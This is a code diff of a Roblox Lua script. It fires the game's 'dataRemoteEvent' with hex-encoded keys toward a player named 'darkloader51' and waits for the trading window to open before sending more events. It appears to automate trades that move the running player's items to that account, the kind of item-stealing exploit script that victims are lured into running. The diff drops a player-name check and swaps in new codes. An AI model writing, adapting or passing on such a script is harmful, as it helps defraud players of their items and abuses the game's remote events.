@@ -1,7 +1,5 @@
-for i, v in pairs(game.Players:GetPlayers()) do if v.Name == "darkloader51" then
-wait(0.001)
 wait(0.07)
-local maksimHuEsoS = "mD"
+local maksimHuEsoS = "VT"
 local args = {
     [1] = {
         [1] = {
@@ -209,20 +207,24 @@ wait(0.07)
 local args = {
     [1] = {
         [1] = {
-            [1] = "3338346665313538633137613439323838356132333239333866346337653331",
+            [1] = "3930333965386133393666323433383562663765373432346538366662366433",
             [2] = game:GetService("Players"):WaitForChild("darkloader51")
         },
-        [2] = "q"
+        [2] = "p"
     }
 }
 
 game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+	wait(0.01)
+repeat
+	wait(0.4)
+until game:GetService("Players").LocalPlayer.PlayerGui.Lobby.TradingFrame.Visible == true
 local args = {
     [1] = {
         [1] = {
             [1] = 2424
         },
-        [2] = "4"
+        [2] = "J"
     }
 }
 
@@ -234,10 +236,8 @@ until game:GetService("Players").LocalPlayer.PlayerGui.Lobby.TradingFrame.Visibl
 local args = {
     [1] = {
         [1] = {},
-        [2] = "s"
+        [2] = "y"
     }
 }
 
 game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
-end
-end
